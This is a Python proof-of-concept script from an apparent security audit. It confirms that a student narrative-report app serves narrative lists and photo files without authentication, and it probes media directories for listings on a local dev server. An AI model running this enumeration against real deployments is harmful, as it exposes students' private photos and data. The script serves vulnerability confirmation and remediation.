#!/usr/bin/env python3
"""
PoC 01 — F-004 CRITICAL: Unauthenticated Access to Narrative Report Photos

Demonstrates that narrative report photo endpoints return full photo URLs
without any authentication token, allowing anyone to enumerate and download
student narrative photos.

Exploitation chain:
  1. Register student, approve via shell, login → obtain token
  2. Create student profile + narrative with photo
  3. GET /api/student/narratives/ WITHOUT auth → list exposes photo URLs
  4. GET /media/<path> WITHOUT auth → download photo file

Expected result:
  - Steps 3-4 succeed WITHOUT Authorization header → VULNERABILITY CONFIRMED
"""

import requests
import json
import sys
import time
from datetime import date
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

from poc_helpers import (
    BASE_URL, API, MEDIA, RESULTS, log, record,
    create_test_image, register_and_approve, login_user,
)

RESULTS.clear()


def setup_test_data(session):
    """Register student, approve, login, create profile + narrative with photo."""
    timestamp = int(time.time())
    username = f"poc_narr_{timestamp}"
    password = "PocTest@2026!"

    log("Step 1: Register + approve + login student account")
    token = register_and_approve(session, username, password, f"{username}@gmail.com", "POC", "NarrativeTest")
    if not token:
        return None, None
    log(f"Got token: {token[:12]}...", "OK")

    # Create student profile
    log("Step 2: Create student profile")
    profile_resp = session.post(f"{API}/student/profile/", json={
        "student_id": f"STU-{timestamp}",
        "department": "IT",
        "course": "BSIT",
        "year_level": "3rd",
        "gpa": "3.50",
    }, headers={"Authorization": f"Token {token}"})
    log(f"Profile create: {profile_resp.status_code}", "OK" if profile_resp.status_code in (200, 201) else "WARN")

    # Create test image
    test_image = create_test_image()

    # Create narrative with photo
    log("Step 3: Create narrative report with photo")
    today = date.today().isoformat()
    with open(test_image, "rb") as f:
        nar_resp = session.post(
            f"{API}/student/narratives/",
            files={"photo_1": ("test_photo.png", f, "image/png")},
            data={
                "log_date": today,
                "topic": "PoC Test Narrative",
                "content": "This is a test narrative for PoC 01 — unauthenticated photo access.",
            },
            headers={"Authorization": f"Token {token}"},
        )
    log(f"Narrative create: {nar_resp.status_code}", "OK" if nar_resp.status_code in (200, 201) else "WARN")

    return token, username


def test_narrative_list_with_auth(session, token):
    """Baseline: list narratives WITH auth token."""
    log("Step 4: GET /api/student/narratives/ with auth token")
    resp = session.get(f"{API}/student/narratives/", headers={"Authorization": f"Token {token}"})
    record("F-004.1", "Narrative list WITH auth (baseline)",
           "PASS" if resp.status_code == 200 else "FAIL", f"HTTP {resp.status_code}")

    results = resp.json()
    if isinstance(results, dict) and "results" in results:
        results = results["results"]

    if results:
        log(f"Found {len(results)} narrative(s)")
        for i, nar in enumerate(results[:3]):
            photo_fields = {k: nar.get(k) for k in ["photo_1", "photo_2", "photo_3", "photo_4"] if nar.get(k)}
            log(f"  Narrative {i+1} photos: {photo_fields or 'none'}")
    return results or []


def test_narrative_list_without_auth(session):
    """VULNERABILITY: List narratives WITHOUT any auth token."""
    log("Step 5: GET /api/student/narratives/ WITHOUT auth token")
    resp = session.get(f"{API}/student/narratives/")
    record("F-004.2", "Narrative list WITHOUT auth (CRITICAL)",
           "PASS" if resp.status_code == 200 else "FAIL",
           f"HTTP {resp.status_code} — {'VULNERABLE: data exposed' if resp.status_code == 200 else 'ACCESS DENIED'}")

    if resp.status_code == 200:
        results = resp.json()
        if isinstance(results, dict) and "results" in results:
            results = results["results"]
        if results:
            log(f"  Retrieved {len(results)} narrative(s) WITHOUT authentication!")
        return results
    return []


def test_photo_url_access(session, narratives):
    """Download photo files directly from /media/ path without auth."""
    log("Step 6: Attempt to download photos via /media/ without auth")
    photos_found = []
    for nar in narratives[:5]:
        for field in ["photo_1", "photo_2", "photo_3", "photo_4"]:
            photo_url = nar.get(field)
            if photo_url and photo_url.strip():
                if photo_url.startswith("http"):
                    photos_found.append(photo_url)
                elif photo_url.startswith("/"):
                    photos_found.append(f"{BASE_URL}{photo_url}")
                else:
                    photos_found.append(f"{MEDIA}/{photo_url}")

    if not photos_found:
        log("No photos found in narratives (expected if DB is empty)", "WARN")
        record("F-004.5", "Direct photo access WITHOUT auth", "N/A",
               "No photo URLs found to test — narratives have no photos")
        return

    for url in photos_found[:3]:
        log(f"  Testing: {url}")
        resp = session.get(url)
        record("F-004.5", f"Direct photo access: {url.split('/')[-1]}",
               "PASS" if resp.status_code == 200 else "FAIL",
               f"HTTP {resp.status_code} — {'VULNERABLE: photo downloaded without auth' if resp.status_code == 200 else 'Blocked'}")


def test_media_probing(session):
    """Probe common media paths."""
    log("Step 7: Probe common media paths")
    dirs = ["/media/", "/media/narratives/", "/media/attendance/", "/media/profile_pictures/"]
    for d in dirs:
        resp = session.get(f"{BASE_URL}{d}")
        if resp.status_code == 200:
            log(f"  {d}: accessible ({len(resp.text)} bytes)", "OK")
            if "Index of" in resp.text or "Directory" in resp.text:
                record("F-004.6", f"Directory listing: {d}", "PASS",
                       "VULNERABLE: directory listing enabled")
        else:
            log(f"  {d}: HTTP {resp.status_code}")


def main():
    print("=" * 70)
    print("PoC 01 — F-004 CRITICAL: Unauthenticated Narrative Photo Access")
    print("=" * 70)
    print()

    session = requests.Session()
    session.headers.update({"Content-Type": "application/json"})

    token, username = setup_test_data(session)
    if not token:
        print("\n[-] Setup failed. Is the dev server running on localhost:8000?")
        print("    Run: python manage.py runserver")
        sys.exit(1)

    print()

    narratives = test_narrative_list_with_auth(session, token)
    print()
    unauth_narratives = test_narrative_list_without_auth(session)
    print()
    test_photo_url_access(session, narratives or unauth_narratives)
    print()
    test_media_probing(session)

    # Summary
    print("\n" + "=" * 70)
    print("RESULTS SUMMARY")
    print("=" * 70)
    critical = [r for r in RESULTS if "CRITICAL" in r["description"] or "WITHOUT auth" in r["description"]]
    passed_critical = [r for r in critical if r["status"] == "PASS"]

    for r in RESULTS:
        icon = "[+]" if r["status"] == "PASS" else "[-]" if r["status"] == "FAIL" else "[~]"
        print(f"  {icon} {r['id']}: {r['description']} — {r['status']}")
        if r["detail"]:
            print(f"      {r['detail']}")

    print(f"\nTotal: {len(RESULTS)} tests | Passed: {sum(1 for r in RESULTS if r['status']=='PASS')} | "
          f"Failed: {sum(1 for r in RESULTS if r['status']=='FAIL')} | N/A: {sum(1 for r in RESULTS if r['status']=='N/A')}")

    if passed_critical:
        print(f"\n*** VULNERABILITY CONFIRMED: F-004 — {len(passed_critical)} critical tests passed ***")
        print("    Narrative report photos are accessible WITHOUT authentication.")

    print()

    report_path = Path("poc_scripts/poc_01_results.json")
    report_path.parent.mkdir(exist_ok=True)
    with open(report_path, "w") as f:
        json.dump({
            "poc": "01",
            "vulnerability": "F-004",
            "severity": "CRITICAL",
            "title": "Unauthenticated Access to Narrative Report Photos",
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "results": RESULTS,
            "conclusion": "VULNERABILITY CONFIRMED" if passed_critical else "NOT CONFIRMED",
        }, f, indent=2)
    print(f"  Report saved to: {report_path}")


if __name__ == "__main__":
    main()
